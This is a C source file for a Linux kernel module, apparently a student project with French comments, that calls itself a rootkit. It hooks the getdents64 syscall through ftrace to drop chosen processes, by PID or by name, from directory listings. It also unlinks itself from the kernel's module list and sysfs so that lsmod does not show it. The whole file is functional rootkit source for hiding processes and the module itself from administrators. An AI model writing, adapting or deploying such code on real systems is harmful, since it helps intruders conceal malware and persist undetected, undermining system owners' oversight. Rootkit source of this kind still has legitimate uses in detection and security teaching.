#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student Project");
MODULE_DESCRIPTION("Process hiding module using ftrace");

/* Paramètres du module */
static char *target_name = "";
module_param(target_name, charp, 0);
MODULE_PARM_DESC(target_name, "Process name to hide");

static int target_pid = 0;
module_param(target_pid, int, 0);
MODULE_PARM_DESC(target_pid, "Process PID to hide");

/* Structure pour ftrace hook */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

/* Prototypes */
static int fh_install_hook(struct ftrace_hook *hook);
static void fh_remove_hook(struct ftrace_hook *hook);

/* Original syscall pointer */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,11,0)
static asmlinkage long (*real_getdents64)(const struct pt_regs *);
#else
static asmlinkage long (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
#endif

/* Fonction pour lire le nom du processus */
static int get_process_name(const char *pid_str, char *buf, size_t size)
{
    struct file *f;
    char path[128];
    loff_t pos = 0;
    int ret;
    
    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
    f = filp_open(path, O_RDONLY, 0);
    
    if (IS_ERR(f))
        return -1;
    
    ret = kernel_read(f, buf, size - 1, &pos);
    filp_close(f, NULL);
    
    if (ret > 0) {
        buf[ret] = '\0';
        /* Enlever le \n final */
        if (buf[ret - 1] == '\n')
            buf[ret - 1] = '\0';
        return 0;
    }
    
    return -1;
}

/* Hook getdents64 */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    long ret;
    char proc_name[256];
    int pid;
    int should_hide;
    
    /* Appeler la vraie fonction */
    ret = real_getdents64(regs);
    
    if (ret <= 0)
        return ret;
    
    /* Allouer mémoire kernel pour manipuler les entrées */
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;
    
    /* Copier depuis l'espace utilisateur */
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    /* Parcourir les entrées */
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        should_hide = 0;
        
        /* Vérifier si c'est un PID (nombre) */
        if (kstrtoint(current_dir->d_name, 10, &pid) == 0) {
            /* Masquer par PID */
            if (target_pid != 0 && pid == target_pid) {
                should_hide = 1;
                printk(KERN_DEBUG "rootkit: hiding PID %d\n", pid);
            }
            
            /* Masquer par nom */
            if (!should_hide && target_name[0] != '\0') {
                if (get_process_name(current_dir->d_name, proc_name, sizeof(proc_name)) == 0) {
                    if (strcmp(proc_name, target_name) == 0) {
                        should_hide = 1;
                        printk(KERN_DEBUG "rootkit: hiding process %s (PID %d)\n", target_name, pid);
                    }
                }
            }
        }
        
        /* Si on doit masquer cette entrée */
        if (should_hide) {
            if (previous_dir) {
                /* Ajouter la taille de l'entrée courante à la précédente */
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                /* C'est la première entrée, la supprimer en déplaçant les autres */
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret - offset);
                continue;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    /* Recopier vers l'espace utilisateur */
    if (copy_to_user(dirent, dirent_ker, ret))
        ret = -EFAULT;
    
    kfree(dirent_ker);
    return ret;
}

/* Callback ftrace pour kernel 6.11+ */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,11,0)
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
        struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}
#else
/* Callback ftrace pour kernel < 6.11 */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
        struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}
#endif

/* Résoudre l'adresse d'une fonction */
static int resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    
    if (!hook->address) {
        printk(KERN_ERR "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

/* Installer un hook ftrace */
static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    
    err = resolve_hook_address(hook);
    if (err)
        return err;
    
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;
    
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "rootkit: ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }
    
    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "rootkit: register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    
    return 0;
}

/* Retirer un hook */
static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    
    err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk(KERN_ERR "rootkit: unregister_ftrace_function failed: %d\n", err);
    
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk(KERN_ERR "rootkit: ftrace_set_filter_ip failed: %d\n", err);
}

/* Définir le hook */
static struct ftrace_hook hooked_syscalls[] = {
    { "sys_getdents64", hook_getdents64, &real_getdents64 },
};

/* Initialisation du module */
static int __init rootkit_init(void)
{
    int err;
    
    printk(KERN_INFO "rootkit: loading on kernel %d.%d.%d...\n", 
           LINUX_VERSION_CODE >> 16,
           (LINUX_VERSION_CODE >> 8) & 0xFF,
           LINUX_VERSION_CODE & 0xFF);
    
    err = fh_install_hook(&hooked_syscalls[0]);
    if (err)
        return err;
    
    printk(KERN_INFO "rootkit: loaded successfully\n");
    
    if (target_pid != 0)
        printk(KERN_INFO "rootkit: hiding PID: %d\n", target_pid);
    if (target_name[0] != '\0')
        printk(KERN_INFO "rootkit: hiding process name: %s\n", target_name);
    
    /* Masquer le module lui-même */
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    printk(KERN_INFO "rootkit: module hidden from lsmod\n");
    
    return 0;
}

/* Nettoyage du module */
static void __exit rootkit_exit(void)
{
    fh_remove_hook(&hooked_syscalls[0]);
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
